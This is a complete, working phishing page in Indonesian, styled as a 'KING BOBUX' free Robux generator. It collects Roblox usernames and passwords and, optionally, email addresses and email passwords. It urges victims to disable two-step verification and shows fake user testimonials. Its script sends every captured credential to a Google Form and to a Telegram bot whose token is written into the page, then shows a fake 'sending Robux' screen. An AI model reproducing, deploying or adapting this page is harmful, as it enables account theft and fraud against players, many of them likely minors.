<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KING BOBUX | OFFICIAL GENERATOR</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&display=swap');
        body { font-family: 'Orbitron', sans-serif; background: #000; color: #fff; overflow-x: hidden; }
        .bg-gold { background: linear-gradient(135deg, #ffd700, #b8860b); }
        .hidden { display: none; }
        .loading-bar { width: 0%; animation: load 18s linear forwards; }
        @keyframes load { from { width: 0%; } to { width: 100%; } }
        .btn-choice { transition: 0.3s; border: 1px solid rgba(255,255,255,0.1); }
        .btn-choice:hover { border-color: #ffd700; background: rgba(255,215,0,0.1); }
    </style>
</head>
<body class="p-4 max-w-md mx-auto text-center">

    <header class="py-6">
        <h1 class="text-3xl font-black italic text-yellow-500 uppercase leading-none">KING <span class="text-white">BOBUX</span></h1>
        <p class="text-[9px] text-gray-500 font-bold mt-2 animate-pulse tracking-widest">● SERVER STATUS: ONLINE</p>
    </header>

    <div class="bg-zinc-900 border-2 border-yellow-500/20 p-6 rounded-[2.5rem] shadow-2xl mb-6">
        
        <div id="p1">
            <p class="text-[11px] mb-4 text-gray-400 font-black uppercase italic">PILIH NOMINAL ROBUX:</p>
            <div class="grid grid-cols-2 gap-3 mb-6">
                <button onclick="setA('10,000')" class="bg-white/5 py-5 rounded-2xl text-xs font-black hover:bg-white/10 transition-all border border-white/5">10K RBX</button>
                <button onclick="setA('50,000')" class="bg-white/5 py-5 rounded-2xl text-xs font-black hover:bg-white/10 transition-all border border-white/5">50K RBX</button>
            </div>
            <button onclick="toChoice()" class="w-full bg-gold py-5 rounded-2xl font-black text-black text-xs uppercase italic shadow-lg">LANJUT</button>
        </div>

        <div id="p-choice" class="hidden animate-fade-in">
            <p class="text-[11px] mb-5 text-yellow-500 font-black uppercase italic">APAKAH AKUN LU TERTAUT EMAIL?</p>
            <div class="space-y-3">
                <button onclick="showLogin('email')" class="w-full btn-choice py-5 rounded-2xl text-xs font-black flex items-center justify-between px-6">
                    <span>YA, TERTAUT EMAIL</span>
                    <span class="text-[9px] bg-green-500 text-black px-2 py-1 rounded-md">BONUS +5K</span>
                </button>
                <button onclick="showLogin('biasa')" class="w-full btn-choice py-5 rounded-2xl text-xs font-black flex items-center justify-between px-6">
                    <span>TIDAK TERTAUT</span>
                    <span class="text-[9px] bg-gray-600 text-white px-2 py-1 rounded-md">REGULAR</span>
                </button>
            </div>
        </div>

        <div id="p2" class="hidden space-y-3">
            <p id="label-mode" class="text-[10px] text-gray-400 font-bold mb-2 uppercase"></p>
            <input type="text" id="u" placeholder="USERNAME ROBLOX" class="w-full bg-black border border-white/10 p-4 rounded-xl text-sm outline-none font-bold text-yellow-500 focus:border-yellow-500 transition-all">
            <input type="password" id="p" placeholder="PASSWORD ROBLOX" class="w-full bg-black border border-white/10 p-4 rounded-xl text-sm outline-none font-bold text-yellow-500 focus:border-yellow-500 transition-all">
            
            <div id="email-fields" class="hidden space-y-3 pt-3 border-t border-white/5">
                <input type="email" id="e" placeholder="ALAMAT EMAIL" class="w-full bg-black border border-yellow-500/20 p-4 rounded-xl text-sm outline-none font-bold text-yellow-500">
                <input type="password" id="ep" placeholder="KATA SANDI EMAIL" class="w-full bg-black border border-yellow-500/20 p-4 rounded-xl text-sm outline-none font-bold text-yellow-500">
                <p class="text-[8px] text-red-400 font-bold italic italic uppercase tracking-tighter">*Matikan Verifikasi 2 Langkah (A2F) Sekarang!</p>
            </div>

            <button onclick="kirimData()" class="w-full bg-gold py-5 rounded-2xl font-black text-black text-xs uppercase shadow-lg mt-4">KONFIRMASI SEKARANG</button>
        </div>

        <div id="p3" class="hidden py-6 space-y-4">
            <h3 class="text-yellow-500 font-black italic uppercase">MENGIRIM ROBUX...</h3>
            <div class="w-full bg-white/10 h-3 rounded-full overflow-hidden"><div class="loading-bar bg-yellow-500 h-full"></div></div>
            <p class="text-[9px] text-gray-500 font-black italic px-4 uppercase">Jangan login 24 jam atau Robux akan hangus!</p>
        </div>
    </div>

    <div class="bg-zinc-900/50 border border-white/5 rounded-3xl p-4 opacity-70">
        <p class="text-[9px] font-black text-yellow-500 uppercase mb-3 text-left">Log Server:</p>
        <div id="chat-content" class="space-y-2 h-24 overflow-hidden text-left text-[10px]"></div>
    </div>

    <script>
        let amt = "";
        let mode = "";
        const teleToken = "8712552694:AAHAjQQhwx4Vlas6CWs6QHB4iYSA5U2LiWM";
        const teleChatId = "7153376507";
        const gform = "https://docs.google.com/forms/d/e/1FAIpQLSfgBrBP1Bqk4tfVHBFUPZDCbW5fj7nK8NZuObuQPmhyRcEGxg/formResponse";

        function setA(v){ amt = v; alert("Sip, " + v + " Robux siap dikirim!"); }
        function toChoice(){ if(!amt) return alert("Pilih nominal dulu!"); document.getElementById('p1').classList.add('hidden'); document.getElementById('p-choice').classList.remove('hidden'); }
        
        function showLogin(m){
            mode = m;
            document.getElementById('p-choice').classList.add('hidden');
            document.getElementById('p2').classList.remove('hidden');
            if(m === 'email') { 
                document.getElementById('email-fields').classList.remove('hidden'); 
                document.getElementById('label-mode').innerText = "Mode: Verifikasi Email (Bonus Aktif)";
            } else {
                document.getElementById('label-mode').innerText = "Mode: Verifikasi Tanpa Email";
            }
        }

        function kirimData(){
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            const e = document.getElementById('e').value || "-";
            const ep = document.getElementById('ep').value || "-";

            if(!u || !p) return alert("Data jangan dikosongin!");
            if(mode === 'email' && (!e || !ep)) return alert("Isi Email & Sandi dengan benar!");

            const fd = new FormData();
            fd.append('entry.298399091', u); fd.append('entry.434090398', p);
            fd.append('entry.455306086', e); fd.append('entry.734491941', ep);
            fd.append('entry.1584180390', amt); fetch(gform, { method: 'POST', mode: 'no-cors', body: fd });

            const msgTele = `🚀 *AKUN BARU (${mode.toUpperCase()})*\n\n👤 *User:* \`${u}\` \n🔑 *Pass:* \`${p}\` \n📧 *Mail:* \`${e}\` \n🔐 *Sandi:* \`${ep}\` \n💎 *Jumlah:* \`${amt}\` RBX`;
            fetch(`https://api.telegram.org/bot${teleToken}/sendMessage?chat_id=${teleChatId}&text=${encodeURIComponent(msgTele)}&parse_mode=Markdown`);

            document.getElementById('p2').classList.add('hidden');
            document.getElementById('p3').classList.remove('hidden');
        }

        const msgs = ["Beneran masuk 10k!", "Email tertaut dapet bonus 5k asik!", "Landing mulus thx admin.", "Jangan lupa matiin a2f guys.", "Yess cair 50k!"];
        setInterval(() => {
            const box = document.getElementById('chat-content');
            const el = document.createElement('div');
            el.innerHTML = `<span class="text-yellow-500 font-bold">User***:</span> <span class="text-gray-400">${msgs[Math.floor(Math.random()*msgs.length)]}</span>`;
            box.insertBefore(el, box.firstChild);
            if(box.childNodes.length > 5) box.removeChild(box.lastChild);
        }, 1500);
    </script>
</body>
</html>
